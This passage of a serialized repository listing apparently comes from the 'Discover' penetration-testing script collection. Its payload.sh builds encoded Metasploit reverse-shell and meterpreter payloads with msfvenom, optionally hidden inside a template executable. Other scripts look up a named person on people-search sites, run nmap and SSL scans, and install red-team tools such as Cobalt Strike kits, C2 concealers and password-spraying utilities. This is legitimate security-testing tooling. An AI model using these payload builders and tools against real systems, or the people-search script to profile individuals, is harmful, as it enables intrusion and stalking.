(.elf)\"\necho \"7.   linux/x64/meterpreter_reverse_tcp       (.elf)\"\necho \"8.   linux/x64/shell/reverse_tcp             (.elf)\"\necho \"9.   osx/x64/meterpreter_reverse_https       (.macho)\"\necho \"10.  osx/x64/meterpreter_reverse_tcp         (.macho)\"\necho \"11.  php/meterpreter_reverse_tcp             (.php)\"\necho \"12.  python/meterpreter_reverse_https        (.py)\"\necho \"13.  python/meterpreter_reverse_tcp          (.py)\"\necho \"14.  windows/x64/meterpreter_reverse_https   (multi)\"\necho \"15.  windows/x64/meterpreter_reverse_tcp     (multi)\"\necho \"16.  Previous menu\"\n\necho\necho -n \"Choice: \"\nread -r CHOICE\n\ncase \"$CHOICE\" in\n    1) PAYLOAD=\"android/meterpreter/reverse_tcp\"\n        EXTENTION=\".apk\"\n        FORMAT=\"raw\"\n        ARCH=\"dalvik\"\n        PLATFORM=\"android\" ;;\n    2) PAYLOAD=\"cmd/windows/reverse_powershell\"\n        EXTENTION=\".bat\"\n        FORMAT=\"raw\"\n        ARCH=\"cmd\"\n        PLATFORM=\"windows\" ;;\n    3) PAYLOAD=\"java/jsp_shell_reverse_tcp\"\n        EXTENTION=\".jsp\"\n        FORMAT=\"raw\"\n        ARCH=\"elf\"\n        PLATFORM=\"linux\" ;;\n    4) PAYLOAD=\"java/jsp_shell_reverse_tcp\"\n        EXTENTION=\".jsp\"\n        FORMAT=\"raw\"\n        ARCH=\"cmd\"\n        PLATFORM=\"windows\" ;;\n    5) PAYLOAD=\"java/shell_reverse_tcp\"\n        EXTENTION=\".war\"\n        FORMAT=\"war\"\n        ARCH=\"x64\"\n        PLATFORM=\"linux\" ;;\n    6) PAYLOAD=\"linux/x64/meterpreter_reverse_https\"\n        EXTENTION=\".elf\"\n        FORMAT=\"elf\"\n        ARCH=\"x64\"\n        PLATFORM=\"linux\" ;;\n    7) PAYLOAD=\"linux/x64/meterpreter_reverse_tcp\"\n        EXTENTION=\".elf\"\n        FORMAT=\"elf\"\n        ARCH=\"x64\"\n        PLATFORM=\"linux\" ;;\n    8) PAYLOAD=\"linux/x64/shell/reverse_tcp\"\n        EXTENTION=\".elf\"\n        FORMAT=\"elf\"\n        ARCH=\"x64\"\n        PLATFORM=\"linux\" ;;\n    9) PAYLOAD=\"osx/x64/meterpreter_reverse_https\"\n        EXTENTION=\".macho\"\n        FORMAT=\"macho\"\n        ARCH=\"x64\"\n        PLATFORM=\"osx\" ;;\n    10) PAYLOAD=\"osx/x64/meterpreter_reverse_tcp\"\n        EXTENTION=\".macho\"\n        FORMAT=\"macho\"\n        ARCH=\"x64\"\n        PLATFORM=\"osx\" ;;\n    11) PAYLOAD=\"php/meterpreter_reverse_tcp\"\n        EXTENTION=\".php\"\n        FORMAT=\"raw\"\n        ARCH=\"php\"\n        PLATFORM=\"php\" ;;\n    12) PAYLOAD=\"python/meterpreter_reverse_https\"\n        EXTENTION=\".py\"\n        FORMAT=\"raw\"\n        ARCH=\"python\"\n        PLATFORM=\"python\" ;;\n    13) PAYLOAD=\"python/meterpreter_reverse_tcp\"\n        EXTENTION=\".py\"\n        FORMAT=\"raw\"\n        ARCH=\"python\"\n        PLATFORM=\"python\" ;;\n    14) PAYLOAD=\"windows/x64/meterpreter_reverse_https\"\n        ARCH=\"x64\"\n        PLATFORM=\"windows\"\n        f_format ;;\n    15) PAYLOAD=\"windows/x64/meterpreter_reverse_tcp\"\n        ARCH=\"x64\"\n        PLATFORM=\"windows\"\n        f_format ;;\n    16) f_main ;;\n\n    *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/payload.sh ;;\nesac\n\necho\necho -n \"LHOST: \"\nread -r LHOST\n\n# Check for no answer\nif [ -z \"$LHOST\" ]; then\n    LHOST=$MYIP\n    echo \"[*] Using $MYIP\"\n    echo\nfi\n\necho -n \"LPORT: \"\nread -r LPORT\n\n# Check for no answer.\nif [ -z \"$LPORT\" ]; then\n    LPORT=443\n    echo \"[*] Using 443\"\n    echo\nfi\n\n# Check for valid port number.\nif [[ \"$LPORT\" -lt 1 || \"$LPORT\" -gt 65535 ]]; then\n    f_error\nfi\n\necho -n \"Iterations: \"\nread -r ITERATIONS\n\n# Check for no answer.\nif [ -z \"$ITERATIONS\" ]; then\n    ITERATIONS=1\n    echo \"[*] Using 1\"\nfi\n\n# Check for valid number that is reasonable.\nif [[ \"$ITERATIONS\" -lt 0 || \"$ITERATIONS\" -gt 20 ]]; then\n    f_error\nfi\n\nX=$(echo \"$PAYLOAD\" | sed 's/\\//-/g')\n\necho\necho -n \"Use a template file? (y/N) \"\nread -r ANSWER\n\nif [ \"$ANSWER\" == \"y\" ]; then\n    echo -n \"Enter the path to the file (default whoami.exe): \"\n    read -r TEMPLATE\n\n    if [ -z \"$TEMPLATE\" ]; then\n        TEMPLATE=/usr/share/windows-resources/binaries/whoami.exe\n        echo \"[*] Using /usr/share/windows-resources/binaries/whoami.exe\"\n    fi\n\n    if [ ! -f \"$TEMPLATE\" ]; then\n        f_error\n    fi\n\n    echo\n    msfvenom -p \"$PAYLOAD\" LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f \"$FORMAT\" -a \"$ARCH\" --platform \"$PLATFORM\" -x \"$TEMPLATE\" -e x64/xor_dynamic -i \"$ITERATIONS\" -o $HOME/data/\"$X\"-\"$LPORT\"-\"$ITERATIONS\"\"$EXTENTION\"\nelse\n    echo\n    msfvenom -p \"$PAYLOAD\" LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f \"$FORMAT\" -a \"$ARCH\" --platform \"$PLATFORM\" -e x64/xor_dynamic -i \"$ITERATIONS\" -o $HOME/data/\"$X\"-\"$LPORT\"-\"$ITERATIONS\"\"$EXTENTION\"\nfi\n"
        },
        {
          "name": "person.sh",
          "type": "blob",
          "size": 1.0830078125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nf_runlocally\nclear\nf_banner\n\n# Check if Firefox is running\nif pgrep firefox > /dev/null; then\n    echo\n    echo \"[!] Close Firefox before running script.\"\n    echo\n    exit 1\nfi\n\necho -e \"${BLUE}RECON${NC}\"\necho\necho -n \"First name: \"\nread -r FIRST\n\n# Check for no answer\nif [ -z \"$FIRST\" ]; then\n    f_error\nfi\n\necho -n \"Last name:  \"\nread -r LAST\n\n# Check for no answer\nif [ -z \"$LAST\" ]; then\n    f_error\nfi\n\nxdg-open https://www.411.com/name/\"$FIRST\"-\"$LAST\"/ &\nsleep 2\nURIPATH=\"https://www.advancedbackgroundchecks.com/search/results.aspx?type=&fn=${FIRST}&mi=&ln=${LAST}&age=&city=&state=\"\nxdg-open \"$URIPATH\" &\nsleep 2\nxdg-open https://www.familytreenow.com/search/genealogy/results?first=\"$FIRST\"&last=\"$LAST\" &\nsleep 2\nxdg-open https://www.peekyou.com/\"$FIRST\"%5f\"$LAST\" &\nsleep 2\nxdg-open https://www.addresses.com/people/\"$FIRST\"+\"$LAST\" &\nsleep 2\nxdg-open https://www.spokeo.com/\"$FIRST\"-\"$LAST\" &\nsleep 2\nxdg-open https://www.usphonebook.com/\"$FIRST\"-\"$LAST\"\nsleep 2\nxdg-open https://www.youtube.com/results?search_query=\"$FIRST\"+\"$LAST\" &\n"
        },
        {
          "name": "report.sh",
          "type": "blob",
          "size": 5.28515625,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nEND=$(date +%r\\ %Z)\nFILENAME=\"$NAME\"/report.txt\nhost=$(wc -l \"$NAME\"/hosts.txt | cut -d ' ' -f1)\n\necho \"Nmap Report\" > \"$FILENAME\"\ndate +%A\" - \"%B\" \"%d\", \"%Y >> \"$FILENAME\"\necho >> \"$FILENAME\"\necho \"Start time   $START\" >> \"$FILENAME\"\necho \"Finish time  $END\" >> \"$FILENAME\"\necho \"Scanner IP   $MYIP\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\necho \"$MEDIUM\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\n\necho \"Targets discovered ($host)\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\ncat \"$NAME\"/hosts.txt >> \"$FILENAME\" 2>/dev/null\necho >> \"$FILENAME\"\n\nif [ ! -s \"$NAME\"/ports.txt ]; then\n    rm -rf \"$NAME\" tmp*\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo \"[*] Scan complete.\"\n    echo\n    echo -e \"${YELLOW}No hosts found with open ports.${NC}\"\n    echo\n    exit\nelse\n    PORTS=$(wc -l \"$NAME\"/ports.txt | cut -d ' ' -f1)\nfi\n\necho \"$MEDIUM\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\necho \"Open ports ($PORTS)\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\n\nif [ -s \"$NAME\"/ports-tcp.txt ]; then\n    echo \"TCP ports\" >> \"$FILENAME\"\n    cat \"$NAME\"/ports-tcp.txt >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\nfi\n\nif [ -s \"$NAME\"/ports-udp.txt ]; then\n    echo \"UDP ports\" >> \"$FILENAME\"\n    cat \"$NAME\"/ports-udp.txt >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\nfi\n\necho \"$MEDIUM\" >> \"$FILENAME\"\n\nif [ -f \"$NAME\"/banners.txt ]; then\n    banners=$(wc -l \"$NAME\"/banners.txt | cut -d ' ' -f1)\n    echo >> \"$FILENAME\"\n    echo \"Banners ($banners)\" >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\n    cat \"$NAME\"/banners.txt >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\n    echo \"$MEDIUM\" >> \"$FILENAME\"\nfi\n\necho >> \"$FILENAME\"\necho \"High value targets by port\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\n\nHVPORTS=\"13 19 21 22 23 25 37 53 67 69 70 79 80 102 110 111 119 123 135 137 139 143 161 389 407 433 443 445 465 500 502 512 513 514 523 524 548 554 563 587 623 631 636 771 831 873 902 993 995 998 1050 1080 1099 1158 1344 1352 1433 1434 1521 1604 1720 1723 1883 1900 1911 1962 2049 2202 2302 2362 2375 2628 2947 3000 3031 3050 3260 3306 3310 3389 3478 3500 3632 3671 4369 4800 5019 5040 5060 5353 5432 5560 5631 5632 5666 5672 5683 5850 5900 5920 5984 5985 6000 6001 6002 6003 6004 6005 6379 6481 6666 7210 7634 7777 8000 8009 8080 8081 8091 8140 8222 8332 8333 8400 8443 8834 9000 9084 9100 9160 9600 9999 10000 10809 11211 12000 12345 13364 17185 19150 27017 28784 30718 31337 35871 37777 44818 46824 47808 49152 50000 50030 50060 50070 50075 50090 60010 60030\"\n\nfor i in $HVPORTS; do\n    if [ -f \"$NAME\"/\"$i\".txt ]; then\n        echo \"Port $i\" >> \"$FILENAME\"\n        cat \"$NAME\"/\"$i\".txt >> \"$FILENAME\"\n        echo >> \"$FILENAME\"\n    fi\ndone\n\necho \"$MEDIUM\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\ncat \"$NAME\"/nmap.txt >> \"$FILENAME\"\necho \"$MEDIUM\" >> \"$FILENAME\"\necho \"$MEDIUM\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\necho \"Nmap scripts\" >> \"$FILENAME\"\necho >> \"$FILENAME\"\n\nSCRIPTS=\"script-13 script-21 script-22 script-23 script-smtp script-37 script-53 script-67 script-70 script-79 script-102 script-110 script-111 script-nntp script-123 script-137 script-139 script-143 script-161 script-389 script-443 script-445 script-500 script-523 script-524 script-548 script-554 script-623 script-631 script-636 script-873 script-993 script-995 script-1050 script-1080 script-1099 script-1344 script-1352 script-1433 script-1434 script-1521 script-1604 script-1723 script-1883 script-1911 script-1962 script-2049 script-2202 script-2302 script-2375 script-2628 script-2947 script-3031 script-3260 script-3306 script-3310 script-3389 script-3478 script-3632 script-3671 script-4369 script-5019 script-5060 script-5353 script-5666 script-5672 script-5683 script-5850 script-5900 script-5984 script-x11 script-6379 script-6481 script-6666 script-7210 script-7634 script-8000 script-8009 script-8081 script-8091 script-8140 script-bitcoin script-9100 script-9160 script-9600 script-9999 script-10000 script-10809 script-11211 script-12000 script-12345 script-17185 script-19150 script-27017 script-31337 script-35871 script-44818 script-47808 script-49152 script-50000 script-hadoop script-apache-hbase\"\n\nfor i in $SCRIPTS; do\n    if [ -f \"$NAME\"/\"$i.txt\" ]; then\n        cat \"$NAME\"/\"$i.txt\" >> \"$FILENAME\"\n        echo \"$MEDIUM\" >> \"$FILENAME\"\n        echo >> \"$FILENAME\"\n    fi\ndone\n\nif [ -f \"$NAME\"/script-smbvulns.txt ]; then\n    echo \"May be vulnerable to MS08-067.\" >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\n    cat \"$NAME\"/script-smbvulns.txt >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\n    echo \"$MEDIUM\" >> \"$FILENAME\"\n    echo >> \"$FILENAME\"\nfi\n\nif [ -f \"$NAME\"/script-onesixtyone.txt ] || [ -f \"$NAME\"/script-smbclient.txt ] || [ -f \"$NAME\"/ike-scan.txt ]; then\n    echo \"Additional enumeration\" >> \"$FILENAME\"\n\n    if [ -f \"$NAME\"/script-onesixtyone.txt ]; then\n        echo >> \"$FILENAME\"\n        echo \"- onesixtyone\" >> \"$FILENAME\"\n        cat \"$NAME\"/script-onesixtyone.txt >> \"$FILENAME\"\n    fi\n\n    if [ -f \"$NAME\"/script-smbclient.txt ]; then\n        echo >> \"$FILENAME\"\n        echo \"- smbclient\" >> \"$FILENAME\"\n        cat \"$NAME\"/script-smbclient.txt >> \"$FILENAME\"\n    fi\n\n    if [ -f \"$NAME\"/script-ike-scan.txt ]; then\n        echo >> \"$FILENAME\"\n        echo \"- ike-scan\" >> \"$FILENAME\"\n        cat \"$NAME\"/script-ike-scan.txt >> \"$FILENAME\"\n    fi\nfi\n\nmv \"$NAME\" \"$HOME\"/data/\n\nSTART=0\nEND=0\n\necho\necho \"$MEDIUM\"\necho\necho \"[*] Scan complete.\"\necho\necho -e \"The new report is located at ${YELLOW}$HOME/data/$NAME/report.txt${NC}\"\n"
        },
        {
          "name": "report",
          "type": "tree",
          "content": null
        },
        {
          "name": "resource",
          "type": "tree",
          "content": null
        },
        {
          "name": "ssl.sh",
          "type": "blob",
          "size": 4.2412109375,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nclear\nf_banner\n\necho -e \"${BLUE}Check for SSL certificate issues.${NC}\"\necho\necho \"List of IP:port.\"\necho\n\nf_location\n\necho\necho \"$MEDIUM\"\necho\n\necho \"Running sslyze.\"\nsslyze --targets_in=\"$LOCATION\" --resum --reneg --heartbleed --certinfo --sslv2 --sslv3 --openssl_ccs > tmp\n# Remove the first 20 lines and cleanup\nsed '1,20d' tmp | grep -Eiv '(=>|error:|error|is trusted|not supported|ok - supported|opensslerror|server rejected|timeout|unexpected error)' |\n# Find FOO, if the next line is blank, delete both lines\nawk '/Compression/ { Compression = 1; next }  Compression == 1 && /^$/ { Compression = 0; next }  { Compression = 0 }  { print }' |\nawk '/Renegotiation/ { Renegotiation = 1; next }  Renegotiation == 1 && /^$/ { Renegotiation = 0; next }  { Renegotiation = 0 }  { print }' |\nawk '/Resumption/ { Resumption = 1; next }  Resumption == 1 && /^$/ { Resumption = 0; next }  { Resumption = 0 }  { print }' |\nawk '/SSLV2/ { SSLV2 = 1; next }  SSLV2 == 1 && /^$/ { SSLV2 = 0; next }  { SSLV2 = 0 }  { print }' |\nawk '/SSLV3/ { SSLV3 = 1; next }  SSLV3 == 1 && /^$/ { SSLV3 = 0; next }  { SSLV3 = 0 }  { print }' |\nawk '/Stapling/ { Stapling = 1; next }  Stapling == 1 && /^$/ { Stapling = 0; next }  { Stapling = 0 }  { print }' |\nawk '/Unhandled/ { Unhandled = 1; next }  Unhandled == 1 && /^$/ { Unhandled = 0; next }  { Unhandled = 0 }  { print }' |\n# Find a dash (-), if the next line is blank, delete it\nawk -v n=-2 'NR==n+1 && !NF{next} /-/ {n=NR}1' |\n# Remove double spacing\ncat -s > \"$HOME\"/data/sslyze.txt\n\n###############################################################################################################################\n\necho \"Running sslscan.\"\necho\n\nSTART=$(date +%r\\ %Z)\n\necho \"$MEDIUM\" >> tmp\necho >> tmp\n\nNUMBER=$(wc -l \"$LOCATION\" | cut -d ' ' -f1)\nN=0\n\nwhile read -r LINE; do\n    N=$((N+1))\n    echo \"$LINE\" > ssl_\"$LINE\"\n    echo -n \"[$N/$NUMBER]  $LINE\"\n    sslscan --ipv4 --ssl2 --ssl3 --tlsall --no-colour --connect-timeout=30 \"$LINE\" > tmp_\"$LINE\"\n    echo\n    echo >> ssl_\"$LINE\"\n\n    if [ -f tmp_\"$LINE\" ]; then\n        ERROR=$(grep 'ERROR:' tmp_\"$LINE\")\n\n        if [ ! \"$ERROR\" ]; then\n            cat tmp_\"$LINE\" >> ssl_\"$LINE\"\n            echo \"$MEDIUM\" >> ssl_\"$LINE\"\n            echo >> ssl_\"$LINE\"\n            cat ssl_\"$LINE\" >> tmp\n        else\n            echo -e \"${RED}Could not open a connection.${NC}\"\n            echo \"[*] Could not open a connection.\" >> ssl_\"$LINE\"\n            echo >> ssl_\"$LINE\"\n            echo \"$MEDIUM\" >> ssl_\"$LINE\"\n            echo >> ssl_\"$LINE\"\n            cat ssl_\"$LINE\" >> tmp\n        fi\n    else\n        echo -e \"${RED}No response.${NC}\"\n        echo \"[*] No response.\" >> ssl_\"$LINE\"\n        echo >> ssl_\"$LINE\"\n        echo \"$MEDIUM\" >> ssl_\"$LINE\"\n        echo >> ssl_\"$LINE\"\n        cat ssl_\"$LINE\" >> tmp\n    fi\ndone < \"$LOCATION\"\n\nEND=$(date +%r\\ %Z)\n\necho \"sslscan Report\" > tmp2\ndate +%A\" - \"%B\" \"%d\", \"%Y >> tmp2\necho >> tmp2\necho \"Start time   $START\" >> tmp2\necho \"Finish time  $END\" >> tmp2\necho \"Scanner IP   $MYIP\" >> tmp2\n\nmv tmp2 \"$HOME\"/data/sslscan.txt\n\ngrep -v 'info not available.' tmp >> \"$HOME\"/data/sslscan.txt\nrm tmp* ssl_* 2>/dev/null\n\n###############################################################################################################################\n\necho\necho \"Running nmap.\"\necho\n\nNUMBER=$(wc -l \"$LOCATION\" | cut -d ' ' -f1)\nN=0\n\nwhile read -r LINE; do\n    N=$((N+1))\n    PORT=$(echo \"$LINE\" | cut -d ':' -f2)\n    TARGET=$(echo \"$LINE\" | cut -d ':' -f1)\n\n    echo -n \"[$N/$NUMBER]  $LINE\"\n    sudo nmap -Pn -n -T4 --open -p \"$PORT\" -sV --script=rsa-vuln-roca,ssl*,tls-alpn,tls-ticketbleed --script-timeout 20s \"$TARGET\" > tmp\n    echo\n\n    grep -Eiv '(does not|incorrect results|service unrecognized)' tmp | grep -v '^SF' |\n    # Find FOO, if the next line is blank, delete both lines\n    awk '/latency/ { latency = 1; next }  latency == 1 && /^$/ { latency = 0; next }  { latency = 0 }  { print }' |\n    sed 's/Nmap scan report for //g; s/( https:\\/\\/nmap.org ) //g' >> tmp2\n    echo \"$MEDIUM\" >> tmp2\n    echo >> tmp2\ndone < \"$LOCATION\"\n\nmv tmp2 \"$HOME\"/data/nmap-ssl.txt\nrm tmp\n\necho\necho \"$MEDIUM\"\necho\necho \"[*] Scan complete.\"\necho\necho\necho -e \"The new reports are located at ${YELLOW}$HOME/data/sslscan.txt ${NC}and ${YELLOW}nmap-ssl.txt ${NC}\"\n"
        },
        {
          "name": "update.sh",
          "type": "blob",
          "size": 14.0302734375,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Check for root\nif [ $EUID -ne 0 ]; then\n    echo\n    echo \"[!] This script must be ran as root.\"\n    echo\n    exit 1\nfi\n\n# Global variables\nYELLOW='\\033[1;33m'\nBLUE='\\033[1;34m'\nNC='\\033[0m'\n\n# -----------------------------------------------------------------------------------------------\n\n# Clean up deprecated repos\nif [ -d /opt/C2-stuff/ ]; then\n    rm -rf /opt/C2-stuff/\nfi\n\nif [ -d /opt/cobaltstrike/third-party/outflanknl-helpcolor/ ]; then\n    rm -rf /opt/cobaltstrike/third-party/outflanknl-helpcolor/\nfi\n\nif [ -d /opt/DNSRecon/ ]; then\n    rm -rf /opt/DNSRecon/\nfi\n\nif [ -d /opt/DNSRecon-venv/ ]; then\n    rm -rf /opt/DNSRecon-venv/\nfi\n\n# -----------------------------------------------------------------------------------------------\n\necho\necho -e \"${BLUE}Updating operating system.${NC}\"\napt update ; apt -y upgrade ; apt -y dist-upgrade ; apt -y autoremove ; apt -y autoclean ; updatedb\necho\n\nif ! command -v ansible &> /dev/null; then\n    echo -e \"${YELLOW}Installing Ansible.${NC}\"\n    apt install -y ansible-core\n    echo\nfi\n\nif ! command -v aws &> /dev/null; then\n    echo -e \"${YELLOW}Installing AWS.${NC}\"\n    apt install -y awscli\n    echo\nfi\n\nif ! command -v go &> /dev/null; then\n    echo -e \"${YELLOW}Installing Go.${NC}\"\n    apt install -y golang-go\n    echo \"\" >> ~/.zshrc\n    echo \"export GOPATH=/opt/go\" >> ~/.zshrc\n    echo \"export GOROOT=/usr/lib/go\" >> ~/.zshrc\n    echo \"export PATH=\\$PATH:/usr/lib/go/bin:/opt/go/bin\" >> ~/.zshrc\n    mkdir -p /opt/go/{bin,src,pkg}\n    source ~/.zshrc\n    echo\nfi\n\nif ! command -v raven &> /dev/null; then\n    echo -e \"${YELLOW}Installing Raven.${NC}\"\n    apt install -y raven\n    echo\nfi\n\nif ! command -v sublist3r &> /dev/null; then\n    echo -e \"${YELLOW}Installing Sublist3r.${NC}\"\n    apt install -y sublist3r\n    echo\nfi\n\n# -----------------------------------------------------------------------------------------------\n\nif [ -d /opt/BOFs/anthemtotheego-inlineExecute-assembly/.git ]; then\n    echo -e \"${BLUE}Updating anthemtotheego InlineExecute Assembly BOF.${NC}\"\n    cd /opt/BOFs/anthemtotheego-inlineExecute-assembly/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing anthemtotheego InlineExecute Assembly BOF.${NC}\"\n    git clone https://github.com/anthemtotheego/InlineExecute-Assembly /opt/BOFs/anthemtotheego-inlineExecute-assembly\n    echo\nfi\n\nif [ -d /opt/BOFs/outflanknl-c2-tool-collection/.git ]; then\n    echo -e \"${BLUE}Updating Outflanknl C2 Tool Collection BOF.${NC}\"\n    cd /opt/BOFs/outflanknl-c2-tool-collection/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing Outflanknl C2 Tool Collection BOF.${NC}\"\n    git clone https://github.com/outflanknl/C2-Tool-Collection /opt/BOFs/outflanknl-c2-tool-collection\n    echo\nfi\n\nif [ -d /opt/BOFs/outflanknl-helpcolor/.git ]; then\n    echo -e \"${BLUE}Updating Outflanknl HelpColor BOF.${NC}\"\n    cd /opt/BOFs/outflanknl-helpcolor/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing Outflanknl HelpColor BOF.${NC}\"\n    git clone https://github.com/outflanknl/HelpColor /opt/BOFs/outflanknl-helpcolor\n    echo\nfi\n\nif [ -d /opt/BOFs/trustedsec-remote-ops/.git ]; then\n    echo -e \"${BLUE}Updating TrustedSec Remote OPs BOF.${NC}\"\n    cd /opt/BOFs/trustedsec-remote-ops/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing TrustedSec Remote OPs BOF.${NC}\"\n    git clone https://github.com/trustedsec/CS-Remote-OPs-BOF /opt/BOFs/trustedsec-remote-ops\n    echo\nfi\n\nif [ -d /opt/BOFs/trustedsec-sa/.git ]; then\n    echo -e \"${BLUE}Updating TrustedSec Situational Awareness BOF.${NC}\"\n    cd /opt/BOFs/trustedsec-sa/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing TrustedSec Situational Awareness BOF.${NC}\"\n    git clone https://github.com/trustedsec/CS-Situational-Awareness-BOF /opt/BOFs/trustedsec-sa\n    echo\nfi\n\n# -----------------------------------------------------------------------------------------------\n\nif [ -d /opt/cobaltstrike/ ]; then\n    if [ -d /opt/cobaltstrike/elevatekit/.git ]; then\n        echo -e \"${BLUE}Updating CS - ElevateKit.${NC}\"\n        cd /opt/cobaltstrike/elevatekit/ ; git pull\n        echo\n    else\n        echo -e \"${YELLOW}Installing CS - ElevateKit.${NC}\"\n        git clone https://github.com/rsmudge/ElevateKit /opt/cobaltstrike/elevatekit\n        echo\n    fi\n\n    if [ -d /opt/cobaltstrike/RedSiege-C2concealer/.git ]; then\n        echo -e \"${BLUE}Updating CS - RedSiege C2concealer.${NC}\"\n        cd /opt/cobaltstrike/RedSiege-C2concealer/ ; git pull\n        echo\n    else\n        echo -e \"${YELLOW}Installing CS - RedSiege C2concealer.${NC}\"\n        git clone https://github.com/RedSiege/C2concealer /opt/cobaltstrike/RedSiege-C2concealer\n        echo\n    fi\n\n    if [ -d /opt/cobaltstrike/malleable-c2-profiles/.git ]; then\n        echo -e \"${BLUE}Updating CS - Malleable C2 profiles.${NC}\"\n        cd /opt/cobaltstrike/malleable-c2-profiles/ ; git pull\n        echo\n    else\n        echo -e \"${YELLOW}Installing CS - Malleable C2 profiles.${NC}\"\n        git clone https://github.com/Cobalt-Strike/Malleable-C2-Profiles /opt/cobaltstrike/malleable-c2-profiles\n        echo\n    fi\n\n    if [ -d /opt/cobaltstrike/mgeeky-scripts/.git ]; then\n        echo -e \"${BLUE}Updating CS - mgeeky cobalt arsenal.${NC}\"\n        cd /opt/cobaltstrike/mgeeky-scripts/ ; git pull\n        echo\n    else\n        echo -e \"${YELLOW}Installing CS - mgeeky cobalt arsenal.${NC}\"\n        git clone https://github.com/mgeeky/cobalt-arsenal /opt/cobaltstrike/mgeeky-scripts\n    echo\n    fi\n\n    if [ -d /opt/cobaltstrike/tylous-sourcepoint/.git ]; then\n        echo -e \"${BLUE}Updating CS - Tylous SourcePoint.${NC}\"\n        cd /opt/cobaltstrike/tylous-sourcepoint/ ; git pull\n        echo\n    else\n        echo -e \"${YELLOW}Installing CS - Tylous SourcePoint.${NC}\"\n        git clone https://github.com/Tylous/SourcePoint /opt/cobaltstrike/tylous-sourcepoint\n        cd /opt/cobaltstrike/tylous-sourcepoint/\n        go get gopkg.in/yaml.v2\n        go build SourcePoint.go\n        echo\n    fi\nfi\n\n# -----------------------------------------------------------------------------------------------\n\nif [ -d /opt/discover/.git ]; then\n    echo -e \"${BLUE}Updating Discover.${NC}\"\n    cd /opt/discover ; git pull\n    echo\nfi\n\nif ! command -v dnstwist &> /dev/null; then\n    echo -e \"${YELLOW}Installing dnstwist.${NC}\"\n    apt install -y dnstwist\n    echo\nfi\n\nif [ -d /opt/Domain-Hunter/.git ]; then\n    echo -e \"${BLUE}Updating Domain Hunter.${NC}\"\n    cd /opt/Domain-Hunter/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing Domain Hunter.${NC}\"\n    git clone https://github.com/threatexpress/domainhunter /opt/Domain-Hunter\n    echo\n    echo -e \"${YELLOW}Setting up Domain Hunter virtualenv.${NC}\"\n    virtualenv -p /usr/bin/python3 /opt/Domain-Hunter-venv\n    source /opt/Domain-Hunter-venv/bin/activate\n    cd /opt/Domain-Hunter/\n    pip3 install pytesseract\n#    pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org pytesseract\n    chmod 755 domainhunter.py\n    deactivate\n    echo\nfi\n\nif [ -d /opt/DomainPasswordSpray/.git ]; then\n    echo -e \"${BLUE}Updating DomainPasswordSpray.${NC}\"\n    cd /opt/DomainPasswordSpray/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing DomainPasswordSpray.${NC}\"\n    git clone https://github.com/dafthack/DomainPasswordSpray /opt/DomainPasswordSpray\n    echo\nfi\n\nif [ -d /opt/Egress-Assess/.git -a -d /opt/Egress-Assess-venv ]; then\n    echo -e \"${BLUE}Updating Egress-Assess.${NC}\"\n    cd /opt/Egress-Assess/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing Egress-Assess.${NC}\"\n    git clone https://github.com/RedSiege/Egress-Assess /opt/Egress-Assess\n    echo\n    echo -e \"${YELLOW}Setting up Egress-Assess virtualenv.${NC}\"\n    virtualenv -p /usr/bin/python3 /opt/Egress-Assess-venv\n    source /opt/Egress-Assess-venv/bin/activate\n    cd /opt/Egress-Assess\n    pip3 install -r requirements.txt\n    # If you are in a corp env that is doing MITM with SSL, use the following line instead. Do the same for all Python repos.\n#    pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org -r requirements.txt --upgrade | grep -v 'already satisfied'\n    deactivate\n    echo\nfi\n\nif [ -d /opt/egressbuster/.git ]; then\n    echo -e \"${BLUE}Updating egressbuster.${NC}\"\n    cd /opt/egressbuster/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing egressbuster.${NC}\"\n    git clone https://github.com/trustedsec/egressbuster /opt/egressbuster\n    echo\nfi\n\nif ! command -v feroxbuster &> /dev/null; then\n    echo -e \"${YELLOW}Installing feroxbuster.${NC}\"\n    apt install -y feroxbuster\n    echo\nfi\n\nif ! command -v gobuster &> /dev/null; then\n    echo -e \"${YELLOW}Installing gobuster.${NC}\"\n    apt install -y gobuster\n    echo\nfi\n\nif [ -d /opt/krbrelayx/.git ]; then\n    echo -e \"${BLUE}Updating krbrelayx.${NC}\"\n    cd /opt/krbrelayx/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing krbrelayx.${NC}\"\n    git clone https://github.com/dirkjanm/krbrelayx /opt/krbrelayx\n    echo\nfi\n\nif [ -d /opt/manspider/.git ]; then\n    echo -e \"${BLUE}Updating MAN-SPIDER.${NC}\"\n    cd /opt/manspider/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing MAN-SPIDER.${NC}\"\n    git 